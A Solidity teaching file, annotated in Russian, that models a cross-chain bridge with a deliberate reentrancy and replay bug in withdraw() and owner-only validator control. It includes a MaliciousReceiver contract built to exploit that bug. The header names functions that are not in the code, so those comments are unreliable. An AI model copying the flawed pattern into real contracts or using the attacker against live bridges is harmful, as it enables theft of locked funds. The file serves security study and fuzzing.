// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title SimpleBridge — упрощённая модель L1-стороны моста
/// @notice Учебный контракт для Фазы 6. Содержит НАМЕРЕННЫЕ баги,
///         типичные для реальных инцидентов (Ronin, Wormhole):
///         1) claimReward() не помечает сообщение как использованное ДО
///            внешнего вызова -> replay / повторный клейм.
///         2) validate() доверяет любому адресу из validators[] без
///            проверки кворума (в реальных мостах нужен N из M подписей).
contract SimpleBridge {
    address public owner;

    // Сколько ETH заблокировано (внесено) на L1
    uint256 public totalLocked;
    // Сколько "минтед" эквивалента признано выпущенным на L2 (для инварианта)
    uint256 public totalMinted;

    // Баланс каждого пользователя, заблокированный в мосту
    mapping(address => uint256) public locked;

    // Список адресов-валидаторов, которые могут подтверждать сообщения с L2
    mapping(address => bool) public validators;

    // messageId => обработано ли уже сообщение (защита от replay)
    mapping(bytes32 => bool) public processedMessages;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount, bytes32 messageId);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address[] memory initialValidators) {
        owner = msg.sender;
        for (uint256 i = 0; i < initialValidators.length; i++) {
            validators[initialValidators[i]] = true;
        }
    }

    /// Пользователь блокирует ETH на L1 (аналог "moved to L2")
    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        locked[msg.sender] += msg.value;
        totalLocked += msg.value;
        totalMinted += msg.value; // упрощение: 1:1 минт на L2
        emit Deposited(msg.sender, msg.value);
    }

    /// Валидатор подтверждает вывод средств пользователю по сообщению с L2.
    /// @dev БАГ: processedMessages[messageId] помечается ПОСЛЕ внешнего
    ///      вызова transfer — это позволяет реентрантно вызвать withdraw
    ///      повторно с тем же messageId до того как флаг будет выставлен.
    ///      (В отличие от reentrancy на balances, тут дыра на уровне
    ///      "антиреплей" механизма моста — характерная бага для мостов.)
    function withdraw(
        address payable to,
        uint256 amount,
        bytes32 messageId
    ) external {
        require(validators[msg.sender], "not a validator");
        require(!processedMessages[messageId], "already processed");
        require(amount <= totalLocked, "insufficient bridge liquidity");

        // ⚠️ Внешний вызов ДО обновления processedMessages и totalLocked
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "transfer failed");

        totalLocked -= amount;
        totalMinted -= amount;
        processedMessages[messageId] = true; // выставляется СЛИШКОМ ПОЗДНО

        emit Withdrawn(to, amount, messageId);
    }

    /// Добавление валидатора — по замыслу должно требовать кворум,
    /// но в этой версии решает единолично owner (упрощение специально
    /// оставлено, чтобы фаззер сфокусировался на withdraw()).
    function addValidator(address v) external onlyOwner {
        validators[v] = true;
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title MaliciousReceiver — атакующий контракт с fallback для реентранси
/// @notice Нужен фаззеру/executor'у, чтобы реально проэксплуатировать
///         reentrancy в withdraw(): EOA не может так атаковать (это уже
///         отмечено в ПРОБЛЕМЫ КОТОРЫЕ УЖЕ ВСТРЕТИЛИСЬ), а этот контракт может.
contract MaliciousReceiver {
    SimpleBridge public bridge;
    address public validatorCaller; // кто должен звать withdraw от лица валидатора
    bytes32 public messageId;
    uint256 public amount;
    uint8 public reentryCount;
    uint8 public maxReentries;

    constructor(address bridgeAddress) {
        bridge = SimpleBridge(bridgeAddress);
    }

    function setAttackParams(bytes32 _messageId, uint256 _amount, uint8 _maxReentries) external {
        messageId = _messageId;
        amount = _amount;
        maxReentries = _maxReentries;
        reentryCount = 0;
    }

    // Валидатор (в тесте — attacker-аккаунт, добавленный как validator)
    // вызывает withdraw с to = address(this).
    receive() external payable {
        if (reentryCount < maxReentries) {
            reentryCount += 1;
            // Реентрантно дёргаем withdraw ещё раз с тем же messageId,
            // пока processedMessages[messageId] ещё не выставлен в true.
            try bridge.withdraw(payable(address(this)), amount, messageId) {
                // ok
            } catch {
                // если провалилось - просто останавливаемся
            }
        }
    }
}
